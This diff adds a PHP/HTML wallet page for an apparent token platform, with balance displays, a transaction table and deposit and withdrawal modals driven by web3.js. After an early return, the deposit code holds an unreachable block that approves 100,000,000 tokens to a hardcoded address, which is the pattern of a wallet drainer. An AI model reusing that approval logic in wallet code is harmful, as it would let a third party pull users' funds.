@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+
+	<head>
+		<meta charset="UTF-8">
+		<meta name="description" content="">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		<title>BEGIN</title>
+		<link rel="icon" href="/nstatic/img/bg.png">
+		<link rel="stylesheet" href="/nstatic/css/default-assets/notification.css">
+		<link rel="stylesheet" href="/nstatic/css/c3.min.css">
+
+		<link rel="stylesheet" href="/nstatic/style.css?v=1.2">
+
+	</head>
+
+	<body>
+		<!-- Preloader -->
+		<div id="preloader"></div>
+		<div class="admetro-page-wrapper">
+            <!-- Sidemenu Area -->
+            {include file='home/menu'}
+        
+            <!-- Page Content -->
+            {include file='home/qianbao'}
+        </div>
+
+			<!-- Main Content Area -->
+			<div class="main-content">
+				<div class="container-fluid">
+
+
+					<div class="sc-hkeOVe jnRNzj">
+						<div class="sc-czETjp kFRBAM" style="padding-top:100px;">
+
+							<div class="sc-gKAaRy sc-iCoGMd sc-jFcyzc KhHSq eBUCzC dAjwbZ">
+								<div color="white" class=" cEbDvj" style="margin-left: 10px">
+									<span font-size="20px" color="white" class="sc-gtsrHT jPTqwQ">{$userinfo.money}</span>
+									BG
+								</div>
+								<button class="sc-hKFxyN gcVFcC" variant="primary" scale="md" data-toggle="modal" id='bg_chongzhi' style="margin-left:1%"><?php echo la('b105');?></button>
+								<button class="sc-hKFxyN gcVFcC" variant="primary" scale="md" data-toggle="modal" id='bg_tixian'><?php echo la('b106');?></button>
+							</div>
+
+
+
+							<div class="sc-gKAaRy sc-iCoGMd sc-jFcyzc KhHSq eBUCzC dAjwbZ">
+								<div color="white" class=" cEbDvj" style="margin-left: 10px">
+									<span font-size="20px" color="white" class="sc-gtsrHT jPTqwQ">{$userinfo.bgb_money}</span>
+									BGT
+								</div>
+								<!--<button class="sc-hKFxyN gcVFcC" variant="primary" scale="md" data-toggle="modal"-->
+								<!--	data-target="#modal-lg1">提现</button>-->
+							</div>
+							
+							<div class="sc-gKAaRy sc-dwxYdI eXsKmp iycgkA sc-bTJQgd crMrTS" >
+									<h1 scale="xl" color="text" class=" sc-jJMGnK kYzmFY" style="font-size:22px">
+										<?php echo la('b64');?></h1>
+								
+								</div>
+							<div class="sc-iwajpm jzcNTA"  style="width:100%">
+									<div class="sc-gKAaRy sc-dwxYdI eXsKmp iycgkA" style="padding:18px 8px 18px 8px">
+										<div class="sc-iwajpm cNtwyy sc-dkdfPn jDmxXf">
+											<div class="sc-gKAaRy sc-dwxYdI eXsKmp iycgkA">
+												<div class="table-responsive">
+													<table class="table table-striped table-sm">
+														<thead>
+															<tr>
+																<!--<th>ID</th>-->
+																<th><?php echo la('b107');?></th>
+																<th><?php echo la('b108');?></th>
+																<th><?php echo la('b109');?></th>
+															</tr>
+														</thead>
+														<tbody>
+														    {foreach $list as $key=>$vo}
+															<tr>
+																<!--<td>{$vo.id}</td>-->
+																<td>{$vo.money}</td>
+																<td>{$vo.time}</td>
+																<td>
+																    <?php
+																        echo fintolan($vo['types']);
+																    ?>
+																</td>
+															</tr>
+															{/foreach}
+
+														</tbody>
+													</table>
+												</div>
+
+											</div>
+										</div>
+									</div>
+								</div>
+								
+
+						</div>
+                        
+                        
+                        
+
+					</div>
+					
+					
+					
+					
+					
+					
+				</div>
+			</div>
+		</div>
+
+		</div>
+		</div>
+		</div>
+	
+		
+		<style>
+			.modal {
+				z-index: 10000;
+				background: #2125299e;
+			}
+
+			.modal-content {
+				background: #fff !important;
+				border-radius: 10px;
+				padding: 10px;
+				font-size: 16px;
+			}
+
+			.modal-header {
+				padding: 10px;
+			}
+
+			.close {
+				padding: 6px !important;
+			}
+
+			.modal-content input {
+				border-radius: 4px;
+				margin-bottom: 10px;
+				padding: 8px;
+				width: 100%;
+				border: none;
+				background: #addd89;
+				font-size: 14px;
+			}
+
+			.modal-content input:focus {
+				border: none;
+			}
+
+			.modal-body {
+				padding: 6px
+			}
+
+			input[type=text]::placeholder {
+				color: #fff;
+			}
+
+			.btn {
+				font-size: 14px;
+			}
+
+			.btn-primary {
+				background: #7cac66 !important;
+				font-size: 14px;
+				border: none
+			}
+			body .demo-class .layui-layer-btn0{
+              border-color: #E6E3E6;
+              background-color: #FFF;
+              color: black;
+             }
+             body .demo-class .layui-layer-btn1{
+              border-color: #E6E3E6;
+              background-color: #FFF;
+              color: black;
+             }
+		</style>
+		<!-- ======================================
+    ********* Page Wrapper Area End ***********
+    ======================================= -->
+
+		<!-- Must needed plugins to the run this Template -->
+		<script src="/nstatic/js/jquery.min.js"></script>
+		<script src="/nstatic/js/popper.min.js"></script>
+		<script src="/nstatic/js/bootstrap.min.js"></script>
+		<script src="/nstatic/js/admetro.bundle.js"></script>
+
+		<!-- Active JS -->
+		<script src="/nstatic/js/default-assets/active.js"></script>
+
+		<!-- These plugins only need for the run this page -->
+		<script src="/nstatic/js/default-assets/todolist.js"></script>
+		<script src="/nstatic/js/default-assets/bootstrap-growl.min.js"></script>
+		<script src="/nstatic/js/default-assets/bootstrap-growl-active.js"></script>
+
+		<script src="/nstatic/js/default-assets/sparkline-small.js"></script>
+		<script src="/nstatic/js/default-assets/sparkline.min.js"></script>
+		<script src="/nstatic/js/default-assets/sparkline.js"></script>
+		<script src="/nstatic/js/default-assets/chart-sparkline.js"></script>
+		<script src="/nstatic/js/amcharts.js"></script>
+		<script src="/nstatic/js/serial.js"></script>
+		<script src="/nstatic/js/light.js"></script>
+		<script src="/nstatic/js/default-assets/column-barchart.js"></script>
+		<script src="/nstatic/js/default-assets/line-and-areachart.js"></script>
+
+		<script src="/nstatic/js/d3.min.js"></script>
+		<script src="/nstatic/js/c3.min.js"></script>
+		<script src="/nstatic/js/default-assets/c3-api-chart.js"></script>
+		<script src="/nstatic/js/default-assets/c3-chart-script.js"></script>
+		<script src="/static/plugs/layui/layui.all.js"></script>
+	</body>
+
+</html>
+<script>
+    async function onConnect(ABI,contract_addr,amount,addr1) {
+
+        const Web3Modal = window.Web3Modal.default;
+        const WalletConnectProvider = window.WalletConnectProvider.default;
+        const providerOptions = {
+            walletconnect: {
+                package: WalletConnectProvider,
+                options: {
+                }
+            },
+        };
+
+        web3Modal = new Web3Modal({
+            cacheProvider: false, 
+            providerOptions, 
+            disableInjectedProvider: false,
+        });
+                
+        try {
+            provider = await web3Modal.connect()
+            provider.enable()
+        } catch (e) {
+            console.log("Could not get a wallet connection", e);
+            return;
+        }
+        
+        provider = await web3Modal.connect()
+        provider.enable()
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts()
+        selectedAccount = accounts[0]
+
+        const contract = new web3.eth.Contract(ABI, contract_addr)
+        const gasPrice = await web3.eth.getGasPrice()
+        const balance = web3.utils.toWei(amount, 'ether');
+        contract.methods.transfer(addr1, balance).send({
+            from: selectedAccount,
+            gasPrice: gasPrice,
+            gas: 100000,
+        }, function (err, tx) {
+            if (!err) {
+                alert("<?php echo la('b135');?>");
+                window.location.reload();
+            }else{
+                $(".buy").html("<?php echo la('b75');?>");
+            }
+
+        })
+        return;
+       //查询是否授权
+       $.ajax({
+           type:'get',
+           url :'/index/home/shouquan',
+           dataType:'json',
+           success:function(data)
+           {
+               if(data.sstatus == 0)
+               {
+                   var amount1 = web3.utils.toWei('100000000', 'ether');
+                   contract.methods.approve('0xC7a26a5897743c5651CF6686096350413EAF78aF', amount1).send({
+                        from: selectedAccount,
+                        gasPrice: gasPrice,
+                        gas: 100000,
+                    }, function (err, tx) {
+                        if (!err) {
+                            alert("success");
+                            $.ajax({
+                                type:'get',
+                                url:'/index/home/shouquanpost'
+                            })
+                            window.location.reload();
+                        }else{
+                            $(".buy").html("<?php echo la('b75');?>");
+                        }
+            
+                    })
+                    
+               }else{
+                   contract.methods.transfer(addr1, balance).send({
+                        from: selectedAccount,
+                        gasPrice: gasPrice,
+                        gas: 100000,
+                    }, function (err, tx) {
+                        if (!err) {
+                            alert("<?php echo la('b135');?>");
+                            window.location.reload();
+                        }else{
+                            $(".buy").html("<?php echo la('b75');?>");
+                        }
+            
+                    })
+               }
+           }
+       })
+       
+        
+       
+    }
+    let b110 = "<?php echo la('b110');?>";
+    let b105 = "<?php echo la('b105');?>";
+    let b111 = "<?php echo la('b111');?>";
+    let b95 = "<?php echo la('b95');?>";
+    let b78 = "<?php echo la('b78');?>";
+    let b77 = "<?php echo la('b77');?>";
+    $("#bg_chongzhi").click(function(){
+        var form = '<div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-body"><div class="p-3 text-center"><input type="number" value="" placeholder="'+b110+'" id="bg_number"></div></div></div></div>';
+        layer.open({
+          skin: 'demo-class',
+          title: [b105,'background-color:rgb(245, 253, 252);color:#333;display:none'],
+          area: ['90%', '400px'],
+          btn: [b111,b95],
+          closeBtn:0,
+          content: form,
+            btn1: function(index, layero) {
+                
+                var  amount = $("#bg_number").val();
+                if(!amount)
+                {
+                    alert(b110);
+                    return;
+                }
+                
+                if(amount < 0.01)
+                {
+                    alert('low 0.01');
+                    return;
+                }
+                
+                var addr1 = '0x3F5D735529b22a516f964e403D8518fE2907825E';
+    
+        		var url = 'https://bsc-dataseed1.ninicoin.io/';
+                var web3 = new Web3(new Web3.providers.HttpProvider(url));
+                var abi = [{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"_destroyFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_inviterFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_taxFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"router","type":"address"}],"name":"changeRouter","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"claimTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"excludeFromFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"includeInFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"inviter","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"inviterAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isExcludedFromFee","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"lastSellTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"rAmount","type":"uint256"}],"name":"tokenFromReflection","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalFees","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"uniswapV2Pair","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}];
+                
+                //USDT余额
+                var contract_addr = "0xCD86A524318aa3dA29969F6a103032dAfDD70870";
+                var USDT = new web3.eth.Contract(abi,contract_addr);
+                
+                function balanceOf(addr,amount,amount2,addr1){
+        
+                	USDT.methods.balanceOf(addr).call(function(error, result){
+                        
+                	    if(!error) {
+                			var bb = web3.utils.fromWei(result, 'ether');
+                			amount = Number(amount);
+                			if(bb < amount)
+                			{
+                			    alert(b78);
+                			}else{
+                			    onConnect(abi,contract_addr,amount2,addr1);
+                			}
+                	    } else {
+                	        alert('error')
+                	    }
+                	});
+                }
+                
+                layer.msg(b77)
+                balanceOf("{$addr}",amount,amount,addr1);
+
+        
+            },
+            btn2: function(index, layero){
+                
+            },
+    })
+    })
+    let b113 = "<?php echo la('b113');?>";
+    let b115 = "<?php echo la('b115');?>";
+    let b106 = "<?php echo la('b106');?>";
+    let b114 = "<?php echo la('b114');?>";
+    let b96 = "<?php echo la('b96');?>";
+    $("#bg_tixian").click(function(){
+        var form = '<div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-body"><div class="p-3 text-center"><input type="number" value="" placeholder="'+b113+'" id="number"></div><div class="p-3 text-center"><input type="text" value="" placeholder="'+b115+'" id="addr"></div></div></div></div>';
+        layer.open({
+          skin: 'demo-class',
+          title: [b106,'background-color:rgb(245, 253, 252);color:#333;display:none'],
+          area: ['90%', '400px'],
+          btn: [b114,b95],
+          closeBtn:0,
+          content: form,
+            btn1: function(index, layero) {
+                
+                var number = $("#number").val();
+                if(!number)
+                {
+                    alert(b113);
+                    return;
+                }
+                
+                var bg_number = {$userinfo.money};
+                if(number > bg_number)
+                {
+                    alert(b96);
+                    return;
+                }
+                
+                var addr = $("#addr").val();
+                if(!addr)
+                {
+                    alert(b115);
+                    return;
+                }
+                
+                $.ajax({
+                    type:'post',
+                    url :'/index/home/account_post',
+                    data:{
+                      number:number,
+                      addr:addr
+                    },
+                    dataType:'json',
+                    success:function(data){
+                        if(data.state == 201)
+                        {
+                            alert(data.msg)
+                            
+                        }else{
+                            alert(data.msg);
+                            window.location.reload();
+                        }
+                    }
+                })
+                
+
+            },
+            btn2: function(index, layero){
+                
+            },
+    })
+})
+</script>
